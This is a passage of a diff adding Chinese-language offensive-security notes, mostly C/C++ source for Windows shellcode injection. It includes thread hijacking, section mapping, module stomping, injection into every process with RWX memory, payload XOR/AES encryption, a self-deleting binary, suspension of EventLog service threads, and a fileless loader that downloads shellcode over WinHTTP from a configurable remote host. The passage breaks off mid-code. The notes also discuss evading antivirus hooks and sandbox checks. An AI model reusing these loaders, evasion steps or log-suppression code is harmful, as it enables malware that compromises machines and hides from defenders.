+    THREADENTRY32 threadEntry;
+    CONTEXT context;
+
+    //const wchar_t* processName = L&quot;notepad.exe&quot;;
+    //DWORD targetPID = GetProcessIdByName(processName);
+
+    char commandLine[] = &quot;C:\\Windows\\System32\\notepad.exe&quot;;
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi);
+
+    DWORD targetPID = pi.dwProcessId;
+    HWND hWnd = FindWindow(NULL, NULL);
+    while (hWnd != NULL) {
+        DWORD processID;
+        GetWindowThreadProcessId(hWnd, &amp;processID);
+        if (processID == targetPID) {
+            break;
+        }
+        hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
+    }
+
+    ShowWindow(hWnd, SW_HIDE);
+
+
+    Sleep(10);
+    //DWORD targetPID = 988;
+    context.ContextFlags = CONTEXT_FULL;
+    threadEntry.dwSize = sizeof(THREADENTRY32);
+
+    targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+    remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    Thread32First(snapshot, &amp;threadEntry);
+
+    while (Thread32Next(snapshot, &amp;threadEntry))
+    {
+        if (threadEntry.th32OwnerProcessID == targetPID)
+        {
+            threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+            break;
+        }
+    }
+
+    SuspendThread(threadHijacked);
+
+    GetThreadContext(threadHijacked, &amp;context);
+    context.Rip = (DWORD_PTR)remoteBuffer;
+    SetThreadContext(threadHijacked, &amp;context);
+
+    ResumeThread(threadHijacked);
+
+}
+</code></pre>
+<p><img alt="" src="../../images/20230710145603.png" /></p>
+<h2 id="setwindowhookex">SetWindowHookEx注入</h2>
+<pre><code class="language-C">#include &quot;pch.h&quot;
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+int main()
+{
+    HMODULE library = LoadLibraryA(&quot;dllhook.dll&quot;);
+    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, &quot;spotlessExport&quot;);
+
+    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0);
+    Sleep(10*1000);
+    UnhookWindowsHookEx(hook);
+
+    return 0;
+}
+</code></pre>
+<pre><code class="language-C">#include &quot;stdafx.h&quot;
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+extern &quot;C&quot; __declspec(dllexport) int spotlessExport() {
+    unsigned char shellcode[] = &quot;\xfc&quot;;
+
+    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof shellcode);
+    ((void(*)())exec)();
+
+    return 0;
+}
+</code></pre>
+<h2 id="ntcreatesection-ntmapviewofsection">NtCreateSection + NtMapViewOfSection注入</h2>
+<pre><code>
+实现流程：
+使用NtCreateSection创建一个在进程中共享的内存块
+使用ZwMapViewOfSection将在内存中的某节映射到指定进程中
+
+在远程进程中创建一个线程，将这段内存视图映射到线程中，内存视图保存了shellcode，以便远程进程执行shellcode
+
+</code></pre>
+<pre><code class="language-C">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;stdio.h&gt;
+#pragma comment(lib, &quot;ntdll&quot;)
+
+typedef struct _LSA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
+typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
+using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
+using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);
+
+DWORD GetProcessIdByName(const wchar_t* processName) {
+    DWORD pid = 0;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W processEntry;
+        processEntry.dwSize = sizeof(PROCESSENTRY32W);
+        if (Process32FirstW(snapshot, &amp;processEntry)) {
+            do {
+                if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
+                    pid = processEntry.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snapshot, &amp;processEntry));
+        }
+        CloseHandle(snapshot);
+    }
+    return pid;
+}  
+
+int main()
+{
+    unsigned char buf[] = 
+
+        &quot;\xfc&quot;;
+
+
+    myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateSection&quot;));
+    myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtMapViewOfSection&quot;));
+    myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;RtlCreateUserThread&quot;));
+    SIZE_T size = 4096;
+    LARGE_INTEGER sectionSize = { size };
+    HANDLE sectionHandle = NULL;
+    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
+    const wchar_t* processName = L&quot;explorer.exe&quot;;
+    DWORD targetPID = GetProcessIdByName(processName);
+
+    // create a memory section
+    fNtCreateSection(&amp;sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&amp;sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+    // create a view of the memory section in the local process
+    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &amp;localSectionAddress, NULL, NULL, NULL, &amp;size, 2, NULL, PAGE_READWRITE);
+
+    // create a view of the memory section in the target process
+    HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
+    fNtMapViewOfSection(sectionHandle, targetHandle, &amp;remoteSectionAddress, NULL, NULL, NULL, &amp;size, 2, NULL, PAGE_EXECUTE_READ);
+
+    // copy shellcode to the local view, which will get reflected in the target process's mapped view
+    memcpy(localSectionAddress, buf, sizeof(buf));
+
+    HANDLE targetThreadHandle = NULL;
+    fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &amp;targetThreadHandle, NULL);
+
+    return 0;
+}
+
+</code></pre>
+<h2 id="addressofentrypoint-code-injection-without-virtualallocex-rwx">AddressOfEntryPoint Code Injection without VirtualAllocEx RWX</h2>
+<p>未测试成功</p>
+<pre><code class="language-c">#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+#pragma comment(lib, &quot;ntdll&quot;)
+
+int main()
+{
+
+    unsigned char shellcode[] =
+        &quot;\xfc&quot;;
+
+    STARTUPINFOA si;
+    si = {};
+    PROCESS_INFORMATION pi = {};
+    PROCESS_BASIC_INFORMATION pbi = {};
+    DWORD returnLength = 0;
+    CreateProcessA(0, (LPSTR)&quot;c:\\windows\\system32\\notepad.exe&quot;, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &amp;si, &amp;pi);
+
+    // get target image PEB address and pointer to image base
+    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), &amp;returnLength);
+    DWORD pebOffset = (DWORD)pbi.PebBaseAddress + 8;
+
+    // get target process image base address
+    LPVOID imageBase = 0;
+    ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &amp;imageBase, 4, NULL);
+
+    // read target process image headers
+    BYTE headersBuffer[4096] = {};
+    ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
+
+    // get AddressOfEntryPoint
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader-&gt;e_lfanew);
+    LPVOID codeEntry = (LPVOID)(ntHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase);
+
+    // write shellcode to image entry point and execute it
+    WriteProcessMemory(pi.hProcess, codeEntry, shellcode, sizeof(shellcode), NULL);
+    ResumeThread(pi.hThread);
+
+    return 0;
+}
+</code></pre>
+<h2 id="modulestomping">ModuleStomping</h2>
+<pre><code>流程：
+1.起一个进程，获取句柄
+2.分配虚拟内存，将正常dll注入到进程中
+3.在dll中起一个新线程，将shellcode注入到新线程中
+</code></pre>
+<pre><code class="language-c">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;psapi.h&gt;
+
+int main(int argc, char* argv[])
+{
+    PVOID remoteBuffer;
+    wchar_t moduleToInject[] = L&quot;C:\\windows\\system32\\amsi.dll&quot;;
+    HMODULE modules[256] = {};
+    SIZE_T modulesSize = sizeof(modules);
+    DWORD modulesSizeNeeded = 0;
+    DWORD moduleNameSize = 0;
+    SIZE_T modulesCount = 0;
+    CHAR remoteModuleName[128] = {};
+    HMODULE remoteModule = NULL;
+
+
+    unsigned char shellcode[] = 
+
+        &quot;\xfc&quot;;
+
+    // inject a benign DLL into remote process
+    //HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    //processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 8444);
+
+    // 创建进程的参数
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    //// 初始化STARTUPINFOA结构
+    ZeroMemory(&amp;si, sizeof(STARTUPINFOA));
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;  // 设置窗口不可见
+    CreateProcessA(NULL, (LPSTR)&quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);  //起一个挂起状态的notepad进程
+    HANDLE processHandle = pi.hProcess;  //获取notepad进程的进程句柄
+    HANDLE threadHandle = pi.hThread;    //获取notepad进程的线程句柄
+
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);
+    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);
+    HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
+    WaitForSingleObject(dllThread, 1000);
+
+    // find base address of the injected benign DLL in remote process
+    EnumProcessModules(processHandle, modules, modulesSize, &amp;modulesSizeNeeded);
+    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
+    for (size_t i = 0; i &lt; modulesCount; i++)
+    {
+        remoteModule = modules[i];
+        GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
+        if (std::string(remoteModuleName).compare(&quot;amsi.dll&quot;) == 0)
+        {
+            std::cout &lt;&lt; remoteModuleName &lt;&lt; &quot; at &quot; &lt;&lt; modules[i];
+            break;
+        }
+    }
+
+    // get DLL's AddressOfEntryPoint
+    DWORD headerBufferSize = 0x1000;
+    LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
+    ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader-&gt;e_lfanew);
+    LPVOID dllEntryPoint = (LPVOID)(ntHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
+    std::cout &lt;&lt; &quot;, entryPoint at &quot; &lt;&lt; dllEntryPoint;
+
+    // write shellcode to DLL's AddressofEntryPoint
+    WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);
+
+    // execute shellcode from inside the benign DLL
+    CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
+
+    return 0;
+}
+
+</code></pre>
+<h2 id="enumerating-rwx-protected-memory">Enumerating RWX Protected Memory</h2>
+<pre><code>枚举当前进程的RWX内存并远程注入，会把每个进程都尝试去注一遍。
+像病毒一样。
+
+</code></pre>
+<pre><code class="language-c++">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+
+int main()
+{
+    MEMORY_BASIC_INFORMATION mbi = {};
+    LPVOID offset = 0;
+    HANDLE process = NULL;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = {};
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    DWORD bytesWritten = 0;
+    unsigned char shellcode[] = 
+        &quot;\xff&quot;;
+
+    Process32First(snapshot, &amp;processEntry);
+    while (Process32Next(snapshot, &amp;processEntry))
+    {
+        process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID);
+        if (process)
+        {
+            std::wcout &lt;&lt; processEntry.szExeFile &lt;&lt; &quot;\n&quot;;
+            while (VirtualQueryEx(process, offset, &amp;mbi, sizeof(mbi)))
+            {
+                offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
+                if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE &amp;&amp; mbi.State == MEM_COMMIT &amp;&amp; mbi.Type == MEM_PRIVATE)
+                {
+                    std::cout &lt;&lt; &quot;\tRWX: 0x&quot; &lt;&lt; std::hex &lt;&lt; mbi.BaseAddress &lt;&lt; &quot;\n&quot;;
+                    WriteProcessMemory(process, mbi.BaseAddress, shellcode, sizeof(shellcode), NULL);
+                    CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
+                }
+            }
+            offset = 0;
+        }
+        CloseHandle(process);
+    }
+
+    return 0;
+}
+</code></pre>
+<h2 id="functionstomping">FunctionStomping</h2>
+<p>与ModuleStomping类似，但又有不同。</p>
+<pre><code>1.获取一个远程进程的句柄
+2.在远程线程枚举出用户层Kernel32.dll的函数的基址（这里使用的是CreateFileW）
+3.更改内存空间为RWX
+4.往函数基址中写入shellcode
+5.更改内存空间为RCX
+
+</code></pre>
+<h2 id="theardlessinjection">TheardlessInjection</h2>
+<p>https://github.com/CCob/ThreadlessInject
+hook远程进程中的指定函数，当进程执行指定函数的时执行代码</p>
+<h2 id="entry-point-injection">Entry Point Injection</h2>
+<p>https://github.com/Kudaes/EPI</p>
+<p>修改目标进程的PEB信息，PEB中存储了dllmain信息，更改dllmain的地址为shellcode。当目标进程启动或结束一个线程时，会重新调用dllmain，此时会执行shellcode</p>
+<h2 id="dllnotificationinjection20238">DllNotificationInjection(2023/8)</h2>
+<p>https://learn.microsoft.com/en-us/windows/win32/devnotes/ldrregisterdllnotification
+https://github.com/ShorSec/DllNotificationInjection
+<a href="https://shorsec.io/blog/dll-notification-injection/">https://shorsec.io/blog/dll-notification-injection/</a></p>
+<p>在远程进程中修改<code>PLDR_DLL_NOTIFICATION_ENTRY</code>成员，并使<code>Cookie</code>指向shellcode的地址。当远程进程加载dll之前会触发一个通知<code>LdrRegisterDllNotification</code>，从而触发shellcode
+<img alt="" src="../../images/20231007165719.png" /></p>
+<h1 id="shellcode_2">Shellcode加解密</h1>
+<p>安装openssl库
+<code>https://slproweb.com/products/Win32OpenSSL.html</code></p>
+<h2 id="_5">亦或</h2>
+<pre><code class="language-C">加密
+#define KEY 0x01     //进行亦或的字符
+
+unsigned char buf[] = &quot;\xff&quot;;
+int main(int argc, char* argv[])
+{
+    unsigned char c[sizeof(buf)];   //获取shellcode长度
+    for (int i = 0; i &lt; sizeof(buf) - 1; i++)
+    {
+        c[i] = buf[i] ^ KEY;//进行解密
+        printf(&quot;\\x%x&quot;, c[i]);
+    }
+    printf(&quot;\n&quot;);
+
+    return 0;
+}
+</code></pre>
+<pre><code class="language-解密代码">解密
+    #define KEY 0x01    //亦或字符
+
+    unsigned char buff[] = &quot;\xfd&quot;;   //加密后的数据
+
+
+    unsigned char rawData[sizeof(buff)];   //获取shellcode长度
+    for (int i = 0; i &lt; sizeof(buff) - 1; i++)
+    {
+        rawData[i] = buff[i] ^ KEY;//进行解密
+    }
+</code></pre>
+<h2 id="rc4">自定义RC4</h2>
+<pre><code>参考《0APCLdr-单文件》项目，Builder为加密，decrypt为解密，解密从资源表中加载
+</code></pre>
+<h2 id="aes">AES</h2>
+<p><code>不靠谱，依赖三方库</code>，需要改成自定义的AES</p>
+<pre><code class="language-C">#include &lt;cstdio&gt;
+#include &lt;openssl/aes.h&gt;
+#include &lt;corecrt_malloc.h&gt;
+#pragma comment(lib, &quot;libcrypto.lib&quot;)
+
+#define KEY &quot;abcdefghijklmnop&quot;  // AES 密钥，长度为 128 位 (16 字节)
+
+void aesEncrypt(const unsigned char* key, const unsigned char* input, int inputLength, unsigned char* output)
+{
+    AES_KEY aesKey;
+    AES_set_encrypt_key(key, 128, &amp;aesKey);
+    AES_encrypt(input, output, &amp;aesKey);
+}
+
+int main()
+{
+    const char* inputFileName = &quot;payload.bin&quot;;   // 输入二进制文件名
+    const char* outputFileName = &quot;output.bin&quot;; // 输出二进制文件名
+
+    FILE* inputFile;
+    if (fopen_s(&amp;inputFile, inputFileName, &quot;rb&quot;) != 0)
+    {
+        printf(&quot;Failed to open input file.\n&quot;);
+        return 1;
+    }
+
+    // 获取输入文件大小
+    fseek(inputFile, 0, SEEK_END);
+    long inputFileSize = ftell(inputFile);
+    fseek(inputFile, 0, SEEK_SET);
+
+    // 分配内存用于存储输入文件数据
+    unsigned char* buf = (unsigned char*)malloc(inputFileSize);
+    if (!buf)
+    {
+        printf(&quot;Failed to allocate memory.\n&quot;);
+        fclose(inputFile);
+        return 1;
+    }
+
+    // 读取输入文件数据到 buf 数组
+    fread(buf, 1, inputFileSize, inputFile);
+
+    fclose(inputFile); // 关闭输入文件
+
+    // 对数据进行 AES 加密
+    unsigned char* encrypted = (unsigned char*)malloc(inputFileSize);
+    aesEncrypt((const unsigned char*)KEY, buf, inputFileSize, encrypted);
+
+    // 创建并打开输出文件
+    FILE* outputFile;
+    if (fopen_s(&amp;outputFile, outputFileName, &quot;wb&quot;) != 0)
+    {
+        printf(&quot;Failed to create output file.\n&quot;);
+        free(buf);
+        free(encrypted);
+        return 1;
+    }
+
+    // 将加密后的数据写入输出文件
+    fwrite(encrypted, 1, inputFileSize, outputFile);
+
+    fclose(outputFile); // 关闭输出文件
+
+    printf(&quot;Encryption completed.\n&quot;);
+
+    free(buf);
+    free(encrypted);
+
+    return 0;
+}
+
+</code></pre>
+<h1 id="_6">其他</h1>
+<h2 id="_7">程序自删除功能</h2>
+<p>这个程序只会自删除</p>
+<pre><code class="language-c">
+#include &lt;Windows.h&gt;
+#include &lt;strsafe.h&gt;
+
+#define SELF_REMOVE_STRING  TEXT(&quot;cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del /f /q \&quot;%s\&quot;&quot;)
+
+void DelMe()
+{
+    TCHAR szModuleName[MAX_PATH];
+    TCHAR szCmd[2 * MAX_PATH];
+    STARTUPINFO si = {0};
+    PROCESS_INFORMATION pi = {0};
+
+    GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+
+    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+
+void main()
+{
+    DelMe();
+}
+
+</code></pre>
+<h2 id="windows">挂起Windows事件服务</h2>
+<pre><code>从svchost中获取windows事件进程，在进程中枚举线程并挂起。
+本地未测试成功，可能跟权限问题有关
+</code></pre>
+<pre><code class="language-c++">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;Psapi.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;dbghelp.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;strsafe.h&gt;
+
+#pragma comment(lib, &quot;DbgHelp&quot;)
+
+using myNtQueryInformationThread = NTSTATUS(NTAPI*)(
+    IN HANDLE          ThreadHandle,
+    IN THREADINFOCLASS ThreadInformationClass,
+    OUT PVOID          ThreadInformation,
+    IN ULONG           ThreadInformationLength,
+    OUT PULONG         ReturnLength
+    );
+
+
+
+
+int main()
+{
+    HANDLE serviceProcessHandle;
+    HANDLE snapshotHandle;
+    HANDLE threadHandle;
+
+    HMODULE modules[2048] = {};
+    SIZE_T modulesSize = sizeof(modules);
+    DWORD modulesSizeNeeded = 0;
+    DWORD moduleNameSize = 0;
+    SIZE_T modulesCount = 0;
+    WCHAR remoteModuleName[128] = {};
+    HMODULE serviceModule = NULL;
+    MODULEINFO serviceModuleInfo = {};
+    DWORD_PTR threadStartAddress = 0;
+    DWORD bytesNeeded = 0;
+
+    myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtQueryInformationThread&quot;));
+
+    THREADENTRY32 threadEntry;
+    threadEntry.dwSize = sizeof(THREADENTRY32);
+
+    SC_HANDLE sc = OpenSCManagerA(&quot;.&quot;, NULL, MAXIMUM_ALLOWED);
+    SC_HANDLE service = OpenServiceA(sc, &quot;EventLog&quot;, MAXIMUM_ALLOWED);
+
+    SERVICE_STATUS_PROCESS serviceStatusProcess = {};
+
+    //# Get PID of svchost.exe that hosts EventLog service
+    QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&amp;serviceStatusProcess, sizeof(serviceStatusProcess), &amp;bytesNeeded);
+    DWORD servicePID = serviceStatusProcess.dwProcessId;
+
+    //# Open handle to the svchost.exe
+    //serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
+    serviceProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, servicePID);
+    _Post_equals_last_error_ DWORD GetLastError();
+    snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+    //# Get a list of modules loaded by svchost.exe
+    EnumProcessModules(serviceProcessHandle, modules, modulesSize, &amp;modulesSizeNeeded);
+    _Post_equals_last_error_ DWORD GetLastError();
+    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
+    for (size_t i = 0; i &lt; modulesCount; i++)
+    {
+        serviceModule = modules[i];
+
+        //# Get loaded module's name
+        GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));
+
+        if (wcscmp(remoteModuleName, L&quot;wevtsvc.dll&quot;) == 0)
+        {
+            printf(&quot;Windows EventLog module %S at %p\n\n&quot;, remoteModuleName, serviceModule);
+            GetModuleInformation(serviceProcessHandle, serviceModule, &amp;serviceModuleInfo, sizeof(MODULEINFO));
+        }
+    }
+
+    //# Enumerate threads
+    Thread32First(snapshotHandle, &amp;threadEntry);
+    while (Thread32Next(snapshotHandle, &amp;threadEntry))
+    {
+        if (threadEntry.th32OwnerProcessID == servicePID)
+        {
+            threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
+            NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &amp;threadStartAddress, sizeof(DWORD_PTR), NULL);
+
+            //# Check if thread's start address is inside wevtsvc.dll memory range
+                if (threadStartAddress &gt;= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll &amp;&amp; threadStartAddress &lt;= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
+                {
+                    printf(&quot;Suspending EventLog thread %d with start address %p\n&quot;, threadEntry.th32ThreadID, threadStartAddress);
+
+                    //# Suspend EventLog service thread
+                    SuspendThread(threadHandle);
+                    Sleep(2000);
+                }
+        }
+    }
+
+    return 0;
+}
+
+
+</code></pre>
+<h2 id="shellcodehttp">无落地文件shellcode（HTTP下载）</h2>
+<pre><code>一种无文件shellcode的实现方式。
+
+使用winhttp库来远程下载shellcode
+
+改进思路
+1.从远程服务器下载加密的数据，要使用时再解密。（需要准备一套加密程序）
+2.实现调试和沙箱判断，是真实环境时再下载shellcode
+3.敏感函数绕杀软hook
+
+</code></pre>
+<pre><code class="language-c++">#include &lt;windows.h&gt; 
+#include &lt;winhttp.h&gt; 
+#include &lt;stdio.h&gt; 
+#include &lt;Windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;vector&gt;
+
+#pragma comment(lib,&quot;winhttp.lib&quot;) 
+#pragma warning(disable:4996)
+
+typedef struct Params {
+    LPVOID pBaseAddress;
+} PARAMS;
+
+typedef VOID(*fprun)(PARAMS pParams);
+
+
+//XOR解密程序
+void XOR(char* data, int len, unsigned char key) {
+    int i;
+    for (i = 0; i &lt; len; i++)
+        data[i] ^= key;
+}
+
+// Encryption Key
+const char key[2] = &quot;A&quot;;
+size_t keySize = sizeof(key);
+
+//加/解密
+void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) {
+    for (size_t i = 0; i &lt; length; ++i) {
+        buffer[i] ^= key[i % keyLength];
+    }
+}
+
+//枚举堆并XOR加密
+PROCESS_HEAP_ENTRY entry;
+void HeapEncryptDecrypt() {
+    SecureZeroMemory(&amp;entry, sizeof(entry));
+    while (HeapWalk(GetProcessHeap(), &amp;entry)) {
+        if ((entry.wFlags &amp; PROCESS_HEAP_ENTRY_BUSY) != 0) {   //如果内存数据存在
+            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData); //
+        }
+    }
+}
+
+//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
+int main()
+{
+    //--------- CONFIGURE -----------
+    LPCWSTR remotehost = L&quot;192.168.14.1&quot;; //change to your IP
+    int remoteport = 8000; //change to your port
+    LPCWSTR remotedir = L&quot;/TEST1&quot;; //change to your directory of the hosted bin file
+    unsigned char key = 0x7e; //change to your key
+    //-------------------------------
+
+    // Initialize variables 
+    HINTERNET hInternet;
+    HINTERNET hHttpSession;
+    HINTERNET hHttpConnection;
+    HINTERNET hHttpRequest;
+    DWORD dwSize;
+    BOOL bResults;
+    DWORD dwStatus;
+    DWORD dwStatusSize;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    std::vector&lt;unsigned char&gt; PEbuffer;
+
+    // Initialize WinHTTP (change the first argument to a valid User-Agent instead)
+    hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    printf(&quot;[+] WinHTTP initialized\n&quot;);
+
+    // Connect to the HTTP server 
+    hHttpSession = WinHttpConnect(hInternet, remotehost, remoteport, 0);
+    printf(&quot;[+] Connected to HTTP Server\n&quot;);
+
+    // Open an HTTP request 
+    hHttpRequest = WinHttpOpenRequest(hHttpSession, L&quot;GET&quot;, remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    printf(&quot;[+] Sending HTTP GET Request\n&quot;);
+
+    // Send a request 
+    bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    printf(&quot;[+] WinHTTP request sent\n&quot;);
+
+    // Wait for the response 
+    bResults = WinHttpReceiveResponse(hHttpRequest, NULL);
